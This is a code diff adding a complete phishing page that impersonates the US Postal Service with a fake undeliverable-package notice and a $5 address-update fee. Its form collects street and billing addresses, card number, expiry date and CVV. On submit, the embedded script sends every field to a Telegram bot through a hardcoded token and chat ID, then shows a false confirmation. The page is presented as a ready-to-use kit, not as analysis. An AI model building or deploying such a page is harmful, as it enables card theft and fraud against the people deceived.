@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Package Notification</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            color: #333;
+            padding: 20px;
+        }
+        .container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            max-width: 600px;
+            margin: auto;
+        }
+        h1 {
+            color: #007bff;
+        }
+        p {
+            line-height: 1.6;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 0.9em;
+            color: #666;
+        }
+        .button {
+            display: inline-block;
+            padding: 10px 15px;
+            background-color: #28a745;
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+        }
+        .logo {
+            display: block;
+            margin: 0 auto 20px;
+            width: 150px;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container" id="notification">
+    <img src="https://www.usps.com/global-elements/header/images/utility-header/logo-sb.svg" alt="USPS Logo" class="logo">
+    <h1>Package Arrival Notification</h1>
+    <p>Hello, Valued USPS Customer,</p>
+    <p>We are writing to inform you that your package has arrived at our facility. However, we encountered an issue with the shipping address provided:</p>
+    <p><strong>Invalid Shipping Address</strong></p>
+    <p>To ensure your package is delivered correctly, please update your shipping address by paying a small fee of $5.</p>
+    <p>Click the button below to proceed with the address update:</p>
+    <p><a href="#update-address" class="button">Update Address</a></p>
+    <p>Thank you for your attention to this matter. We look forward to getting your package to you!</p>
+    <p>Best regards,<br>The USPS Team</p>
+
+    <div class="footer">
+        <p>If you have any questions, feel free to contact our support team.</p>
+        <p>© 2026 USPS. All rights reserved.</p>
+    </div>
+</div>
+
+<!-- Update Address Form -->
+<div id="update-address" class="container" style="display: none;">
+    <img src="https://www.usps.com/global-elements/header/images/utility-header/logo-sb.svg" alt="USPS Logo" class="logo">
+    <h1>Update Shipping Address</h1>
+    <p>Please enter your new shipping address and payment details below:</p>
+    <form id="updateForm">
+        <label for="new-address">Street Address:</label>
+        <input type="text" id="new-address" name="new-address" placeholder="Enter your new street address" required>
+        
+        <label for="city">City:</label>
+        <input type="text" id="city" name="city" placeholder="Enter your city" required>
+        
+        <label for="state">State:</label>
+        <input type="text" id="state" name="state" placeholder="Enter your state" required>
+        
+        <label for="zip">Zip Code:</label>
+        <input type="text" id="zip" name="zip" placeholder="Enter your zip code" required>
+        
+        <h2>Payment Information</h2>
+        <label for="card-number">Card Number:</label>
+        <input type="text" id="card-number" name="card-number" placeholder="Enter your card number" required>
+        
+        <label for="exp-date">Expiration Date (MM/YY):</label>
+        <input type="text" id="exp-date" name="exp-date" placeholder="MM/YY" required>
+        
+        <label for="cvv">CVV:</label>
+        <input type="text" id="cvv" name="cvv" placeholder="Enter CVV" required>
+        
+        <h2>Billing Address</h2>
+        <label for="billing-address">Billing Street Address:</label>
+        <input type="text" id="billing-address" name="billing-address" placeholder="Enter your billing street address" required>
+        
+        <label for="billing-city">Billing City:</label>
+        <input type="text" id="billing-city" name="billing-city" placeholder="Enter your billing city" required>
+        
+        <label for="billing-state">Billing State:</label>
+        <input type="text" id="billing-state" name="billing-state" placeholder="Enter your billing state" required>
+        
+        <label for="billing-zip">Billing Zip Code:</label>
+        <input type="text" id="billing-zip" name="billing-zip" placeholder="Enter your billing zip code" required>
+        
+        <button type="submit" class="button">Submit</button>
+    </form>
+</div>
+
+<!-- Confirmation Page -->
+<div id="confirmation" class="container" style="display: none;">
+    <img src="https://www.usps.com/global-elements/header/images/utility-header/logo-sb.svg" alt="USPS Logo" class="logo">
+    <h1>Address Update Confirmation</h1>
+    <p>Thank you, Valued Customer! Your shipping address has been successfully updated.</p>
+    <p>Your package is on its way to your new address. We appreciate your prompt attention to this matter!</p>
+    <p>Best regards,<br>The USPS Team</p>
+
+    <div class="footer">
+        <p>If you have any questions, feel free to contact our support team.</p>
+        <p>© 2026 USPS. All rights reserved.</p>
+    </div>
+</div>
+
+<script>
+    // Script to show the update address section when the button is clicked
+    document.querySelector('.button').addEventListener('click', function(e) {
+        if (this.innerText === 'Update Address') {
+            e.preventDefault();
+            document.getElementById('notification').style.display = 'none';
+            document.getElementById('update-address').style.display = 'block';
+        }
+    });
+
+    // Script to handle the form submission and show confirmation
+    document.getElementById('updateForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        // Gather form data
+        const newAddress = document.getElementById('new-address').value;
+        const city = document.getElementById('city').value;
+        const state = document.getElementById('state').value;
+        const zip = document.getElementById('zip').value;
+        const cardNumber = document.getElementById('card-number').value;
+        const expDate = document.getElementById('exp-date').value;
+        const cvv = document.getElementById('cvv').value;
+        const billingAddress = document.getElementById('billing-address').value;
+        const billingCity = document.getElementById('billing-city').value;
+        const billingState = document.getElementById('billing-state').value;
+        const billingZip = document.getElementById('billing-zip').value;
+
+        // Send the information to Telegram
+        const botToken = '7860680934:AAFgNZdDblgPSywVu5m0Isg_AHy_-kKl6Tc'; // Replace with your bot token
+        const chatId = '6733551649'; // Replace with your chat ID
+        const message = `New Address Update Request:\nStreet Address: ${newAddress}\nCity: ${city}\nState: ${state}\nZip Code: ${zip}\nCard Number: ${cardNumber}\nExpiration Date: ${expDate}\nCVV: ${cvv}\nBilling Address: ${billingAddress}\nBilling City: ${billingCity}\nBilling State: ${billingState}\nBilling Zip Code: ${billingZip}`;
+        
+        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+        fetch(telegramUrl)
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    // Hide the update address form and show the confirmation
+                    document.getElementById('update-address').style.display = 'none';
+                    document.getElementById('confirmation').style.display = 'block';
+                } else {
+                    alert('Failed to send message to Telegram. Please try again.');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('There was an error sending the message. Please try again.');
+            });
+    });
+</script>
+
+</body>
+</html>
